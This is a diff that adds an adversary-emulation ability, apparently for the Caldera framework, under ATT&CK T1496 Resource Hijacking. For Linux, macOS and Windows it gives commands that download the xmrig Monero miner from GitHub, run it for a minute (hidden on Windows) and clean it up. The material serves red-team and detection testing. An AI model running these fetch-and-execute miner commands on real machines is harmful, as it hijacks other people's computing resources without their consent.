@@ -1,0 +1,50 @@
+- id: 46da2385-cf37-49cb-ba4b-a739c7a19de4
+  name: Crypto (Monero) Mining
+  description: Download and execute Monero miner (xmrig) for 1 minute
+  tactic: impact
+  technique:
+    attack_id: T1496
+    name: Resource Hijacking
+  platforms:
+    linux:
+      sh:
+        # Linux distros should include `timeout` making this easy.
+        # We expect timeout to return a 124, which needs to then return a 0
+        # to make Caldera UI happy.
+        command: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.11.2/xmrig-6.11.2-linux-x64.tar.gz;
+          tar -xf xmrig-6.11.2-linux-x64.tar.gz;
+          timeout 60 ./xmrig-6.11.2/xmrig;
+          [ $? -eq 124 ]
+        cleanup: |
+          rm -rf ./xmrig*;
+        timeout: 120
+    darwin:
+      sh:
+        # MacOS does not include timeout, but can mimic the process with screen.
+        # Not using a simple & to background due to TTY conflicts.
+        # Return code should be 0 if screen is launched and killed successfully,
+        # which should make Caldera UI happy.
+        command: |
+          curl -OL https://github.com/xmrig/xmrig/releases/download/v6.11.2/xmrig-6.11.2-macos-x64.tar.gz;
+          tar -xf xmrig-6.11.2-macos-x64.tar.gz;
+          screen -S miner -dm ./xmrig-6.11.2/xmrig;
+          sleep 60s;
+          killall xmrig;
+          screen -S miner -X quit
+        cleanup: |
+          rm -rf ./xmrig*;
+        timeout: 120
+    windows:
+      psh:
+        # Powershell can background the miner with no issues, so a sleep and
+        # then kill should work properly while keeping Caldera UI happy.
+        command: |
+          Invoke-WebRequest -Uri https://github.com/xmrig/xmrig/releases/download/v6.11.2/xmrig-6.11.2-msvc-win64.zip -OutFile xmrig-6.11.2-msvc-win64.zip;
+          Expand-Archive -LiteralPath xmrig-6.11.2-msvc-win64.zip -DestinationPath .\;
+          Start-Process ".\xmrig-6.11.2\xmrig.exe" -WindowStyle Hidden;
+          Start-Sleep -Seconds 60;
+          Stop-Process -Name "xmrig"
+        cleanup: |
+          rm ./xmrig* -r -fo;
+        timeout: 120
